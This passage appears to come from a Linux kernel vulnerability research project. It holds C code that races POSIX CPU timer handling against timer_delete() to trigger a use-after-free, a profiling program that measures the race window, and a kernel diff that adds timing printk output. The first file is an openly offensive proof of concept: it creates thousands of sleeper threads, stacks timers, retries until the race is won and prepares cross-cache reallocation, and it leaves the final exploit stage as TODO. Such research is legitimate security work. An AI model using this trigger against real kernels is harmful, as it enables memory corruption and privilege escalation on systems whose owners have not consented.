                SYSCHK(pipe(stall_fds));
                write(stall_fds[1], &m, 1);
                read(stall_fds[0], &m, 1);

                // Block SIGUSR1 and SIGUSR2, blocks them in subsequent threads too
                sigset_t block_mask;
                sigemptyset(&block_mask);
                sigaddset(&block_mask, SIGUSR1);
                sigaddset(&block_mask, SIGUSR2);
                sigprocmask(SIG_BLOCK, &block_mask, NULL);

                // Extend the race window even more by polling the signalfd waitqueue
                // in each thread
                sfd = SYSCHK(signalfd(-1, &block_mask, SFD_CLOEXEC | SFD_NONBLOCK));

                prctl(PR_SET_NAME, "ASDF");
                pthread_barrier_init(&barrier, NULL, 2);
                
                // Get the max number of threads we can create
                struct rlimit rl;
                getrlimit(RLIMIT_NPROC, &rl);

                // Create a couple threads less than the max
                int num_sleep_threads = rl.rlim_max - 20;

                printf("Max threads: %lu, creating %d threads\n", rl.rlim_max, num_sleep_threads);
                
                pthread_t sleep_threads[num_sleep_threads];
              
                // Create as many sleeping threads as possible
                for (int i = 0; i < num_sleep_threads; i++) {
                    int ret = pthread_create(&sleep_threads[i], NULL, (void*)sleep_func, NULL);
                    if (ret != 0) {
                        // If this condition is reached, change `num_sleep_threads` above
                        printf("Failed on thread %d\n", i+1);
                        num_sleep_threads = i;
                        break;
                    }
                }

                // Set up the realloc pipes for cross-cache
                char buf_for_pipe[PAGE_SIZE];
                memset(buf_for_pipe, 0x41, PAGE_SIZE);

                printf("Attempting to win the race...\n");
                int race_won = 0;
                
                while (1) {
                    // printf("Try %d\n", race_retry_count+1);
                    race_won = 0;

                    // Create the REAPEE thread
                    SYSCHK(pthread_create(&reapee_thread, NULL, (void*)reapee_func, NULL));

                    // Parent process writes to us when attached and continued, use
                    // a barrier to continue the REAPEE thread now
                    SYSCHK(read(p2c[0], &m, 1));
                    pthread_barrier_wait(&barrier); // barrier 1

                    // Wait for timers to be created by REAPEE thread
                    pthread_barrier_wait(&barrier); // barrier 2

                    // Arm the timers now, ensuring the first 18 are before the
                    // UAF timer
                    struct itimerspec ts = {
                        .it_interval = {0, 0},
                        .it_value = {
                            .tv_sec = 0,
                            .tv_nsec = ONE_MS_NS - 1,
                        },
                    };
                    
                    for (int i = 0; i < NUM_TIMERS; i++) {
                        timer_settime(stall_timers[i], 0, &ts, NULL);
                    }
                    
                    // Arm UAF timer as the latest one
                    ts.it_value.tv_nsec = ONE_MS_NS;
                    timer_settime(uaf_timer, 0, &ts, NULL);
                    
                    // Now, let REAPEE thread continue, load the shared sync variable
                    // beforehand here
                    int last = __atomic_load_n(&shm->sync, __ATOMIC_ACQUIRE);
                    pthread_barrier_wait(&barrier); // barrier 3
                    
                    // Parent awakes us by changing the shared sync variable and using a futex.
                    //
                    // At this point, if we won the race, `handle_posix_cpu_timers()` will be in
                    // the race window, and `timer_delete()` will see a NULL `sighand`, which 
                    // will cause it to just free the timer unconditionally.
                    //
                    // This will immediately free ->sigq, but defer the timer for RCU free.
                    while (__atomic_load_n(&shm->sync, __ATOMIC_ACQUIRE) == last) {
                        int rc = futex_wait(&shm->sync, last);
                        if (rc == -1 && errno != EAGAIN && errno != EINTR) {
                            perror("futex_wait");
                            getchar(); // Block in error conditions
                        }
                    }
                    timer_delete(uaf_timer);

                    // Wait 100ms max for a SIGUSR2 signal to be received
                    struct timespec sig_ts = { .tv_sec = 0, .tv_nsec = 300000000 };
                    
                    for (;;) {
                        int sig = sigtimedwait(&block_mask, NULL, &sig_ts);
                        if (sig == SIGUSR2) {
                            // We definitely lost the race if SIGUSR2 showed up.
                            race_won = 0;
                            if (race_retry_count % 10 == 0 && race_retry_count > 0)
                                printf("Race lost %d times, still trying...\n", race_retry_count);
                            break;
                        } else if (sig == SIGUSR1) {
                            // Ignore SIGUSR1, however, if we see it, we potentially
                            // won the race. Tentatively just set this
                            race_won = 1;
                            continue; // Ignore SIGUSR1
                        } else if (sig < 0 && errno == EAGAIN){
                            break;
                        } else if (sig < 0 && errno == EINTR) continue;
                    }

                    // At this point, `race_won` will be set to 1 ONLY if we saw
                    // a SIGUSR1 (i.e timers fired), but we didn't see a SIGUSR2
                    // because the UAF timer was freed and realloc'd before it could fire.
                    if (race_won) {
                        printf("Race won for sure! Check dmesg\n");
                        getchar();
                    }

                    // TODO: If we won the race, break out of the loop
                    if (0) break;

                    // Try again if we didn't win
                    syscall_loop_times++;
                    syscall_loop_times %= SYSCALL_LOOP_TIMES_MAX+1;
                    syscall_loop_times = syscall_loop_times == 0 ? 1 : syscall_loop_times;
                    race_retry_count++;

                    // Free stall timers and pad timers
                    for (int i = 0; i < NUM_TIMERS; i++) {
                        timer_delete(stall_timers[i]);
                    }

                    wait_for_rcu();

                    // Signal to parent to try again
                    SYSCHK(write(c2p[1], &m, 1));
                }
                
                // At this point, either the UAF triggered, and you'll see the kernel warning
                // or KASAN splat, or we failed. 
                //
                // TODO exploit: Figure out how to detect if we won the race here
                close(stall_fds[1]);
                
                for (int i = 0; i < num_sleep_threads; i++) {
                    SYSCHK(pthread_join(sleep_threads[i], NULL));
                }
                
                printf("Joined all threads\n");
                
                // Signal to parent to exit
                SYSCHK(write(c2p[1], &m, 1));

                // Wait for parent to exit
                close(c2p[1]);
                close(p2c[0]);
                close(stall_fds[0]);
                close(sfd);
                exit(0);
            }
        }
    }

    // If we break out of the while loop above, the race was won
    // TODO exploit:
    exit(0);
}
```

`profile_handle_posix_cpu_timers.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <sched.h>
#include <err.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/prctl.h>

#define NUM_TIMERS 18
#define NUM_SAMPLES 100000
#define ONE_MS_NS 1000000uLL
#define NUM_SLEEP_THREADS 10000

#define SYSCHK(x) ({            \
    typeof(x) __res = (x);      \
    if (__res == (typeof(x))-1) \
      err(1, "SYSCHK(" #x ")"); \
    __res;                      \
})

void pin_on_cpu(int i) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

static inline long long ts_to_ns(const struct timespec *ts) {
    return (long long)ts->tv_sec * 1000000000LL + (long long)ts->tv_nsec;
}

static long int clock_gettime_avg = 0;

// Can overflow if `NUM_SAMPLES` is too high, but with simple syscalls,
// this works just fine
long int getpid_cpu_usage() {
    struct timespec *ts = malloc(NUM_SAMPLES * sizeof(struct timespec));

    // If `clock_gettime()` avg CPU time usage was not calculated, do it now
    if (clock_gettime_avg == 0) {
        for (int i = 0; i < NUM_SAMPLES; i++) {
            syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
        } 
    
        long int total_nsec = 0;

        for (int i = 0; i < NUM_SAMPLES-1; i++) {
            long int time_taken = (long int)(ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i]));
            total_nsec += time_taken;
        }
    
        clock_gettime_avg = total_nsec / (NUM_SAMPLES-1);
    }

    // Collect CPU time usage of `getpid()` syscall
    for (int i = 0; i < NUM_SAMPLES; i++) {
        syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);
        syscall(__NR_getpid);
    }

    long int total_nsec = 0;
    for (int i = 0; i < NUM_SAMPLES-1; i++) {
        long int time_taken = (long int)(ts_to_ns(&ts[i + 1]) - ts_to_ns(&ts[i])) - clock_gettime_avg;
        total_nsec += time_taken;
    }
    
    free(ts);
    
    // Return average CPU time usage
    return total_nsec / (NUM_SAMPLES-1);
}

timer_t stall_timers[NUM_TIMERS];
timer_t uaf_timer;
int pipefds[2];

pthread_barrier_t barrier;

void thread_func(void) {
    // Pin to same CPU as sleeper threads
    pin_on_cpu(1);
    
    struct sigevent evt = {0};
    evt.sigev_notify = SIGEV_SIGNAL;
    evt.sigev_signo = SIGUSR1;

    prctl(PR_SET_NAME, "PROFILE");

    for (int i = 0; i < NUM_TIMERS; i++) {
        timer_create(CLOCK_THREAD_CPUTIME_ID, &evt, &stall_timers[i]);
    }

    timer_create(CLOCK_THREAD_CPUTIME_ID, &evt, &uaf_timer);

    long int getpid_avg = getpid_cpu_usage();

    pthread_barrier_wait(&barrier); // barrier 1
    pthread_barrier_wait(&barrier); // barrier 2

    // Force timer to be fired now for testing by definitely using up
    // enough CPU time
    for (int i = 0; i < ((ONE_MS_NS / getpid_avg) + 10000); i++) {
        syscall(__NR_getpid);
    }
}

void sleep_func(void) {
    // Pin to same CPU as timer thread
    pin_on_cpu(1);
    char m;

    prctl(PR_SET_NAME, "SLEEPER");

    // Sleep
    read(pipefds[0], &m, 1);
}

int main(int argc, char *argv[]) {
    pin_on_cpu(0);
    pthread_barrier_init(&barrier, NULL, 2);

    // Block SIGUSR1, blocks them in subsequent threads too
    sigset_t mask;
    sigemptyset(&mask);
    sigaddset(&mask, SIGUSR1);
    sigprocmask(SIG_BLOCK, &mask, NULL);

    SYSCHK(pipe(pipefds));

    pthread_t thread;
    int num_sleep_threads = NUM_SLEEP_THREADS;
    pthread_t sleep_threads[num_sleep_threads];

    // Create the thread that will trigger the timer handling
    pthread_create(&thread, NULL, (void*)thread_func, NULL);

    // Create sleeper threads to extend the race window
    for (int i = 0; i < NUM_SLEEP_THREADS; i++) {
        int ret = pthread_create(&sleep_threads[i], NULL, (void*)sleep_func, NULL);

        if (ret != 0) {
            // If this condition is reached, change `NUM_SLEEP_THREADS` above
            printf("Failed on thread %d\n", i+1);
            num_sleep_threads = i;
            break;
        }
    }
    
    // Wait for all threads to create and go to sleep
    usleep(10 * 1000);
    
    // Wait for timer thread to create the timers
    pthread_barrier_wait(&barrier); // barrier 1

    // Arm all stall timers. Just make sure UAF timer is the last one by
    // having it's `it_value` be the largest
    struct itimerspec ts = {
        .it_interval = {0, 0},
        .it_value = {
            .tv_sec = 0,
            .tv_nsec = ONE_MS_NS - 1,
        },
    };

    for (int i = 0; i < NUM_TIMERS; i++) {
        timer_settime(stall_timers[i], 0, &ts, NULL);
    }

    // UAF timer `it_value` must be the largest
    ts.it_value.tv_nsec = ONE_MS_NS;
    timer_settime(uaf_timer, 0, &ts, NULL);

    // Let timer thread run now to trigger timer handling
    pthread_barrier_wait(&barrier); // barrier 2
    pthread_join(thread, NULL);

    return 0;
}
```

`profiler_patch.diff`:

```diff
diff --git a/kernel/time/posix-cpu-timers.c.orig b/kernel/time/posix-cpu-timers.c
index 6bcee47..830dfb9 100644
--- a/kernel/time/posix-cpu-timers.c.orig
+++ b/kernel/time/posix-cpu-timers.c
@@ -12,6 +12,7 @@
 #include <linux/kernel_stat.h>
 #include <trace/events/timer.h>
 #include <linux/tick.h>
+#include <linux/timekeeping.h>
 #include <linux/workqueue.h>
 #include <linux/compat.h>
 #include <linux/sched/deadline.h>
@@ -1292,10 +1293,15 @@ static void handle_posix_cpu_timers(struct task_struct *tsk)
 	struct k_itimer *timer, *next;
 	unsigned long flags, start;
 	LIST_HEAD(firing);
+	u64 profile_t0 = 0, profile_t1 = 0;
 
 	if (!lock_task_sighand(tsk, &flags))
 		return;
 
+	// Faith: Set this bools up after `lock_task_sighand()` so
+	// that they don't accidentally increase the race window somehow
+	const bool profile = !strcmp(tsk->comm, "PROFILE");
+
 	do {
 		/*
 		 * On RT locking sighand lock does not disable interrupts,
@@ -1356,6 +1362,10 @@ static void handle_posix_cpu_timers(struct task_struct *tsk)
 	 */
 	unlock_task_sighand(tsk, &flags);
 
+	// Faith: profile the time taken to handle the timers
+	if (profile)
+		profile_t0 = ktime_get_mono_fast_ns();
+
 	/*
 	 * Now that all the timers on our list have the firing flag,
 	 * no one will touch their list entries but us.  We'll take
@@ -1387,6 +1397,13 @@ static void handle_posix_cpu_timers(struct task_struct *tsk)
 		rcu_assign_pointer(timer->it.cpu.handling, NULL);
 		spin_unlock(&timer->it_lock);
 	}
+
+	// Faith: profile the time taken to handle the timers
+	if (profile) {
+		profile_t1 = ktime_get_mono_fast_ns();
+		printk("handle_posix_cpu_timers: delta_ns=%llu\n",
+			(unsigned long long)(profile_t1 - profile_t0));
+	}
 }
 
 /*

```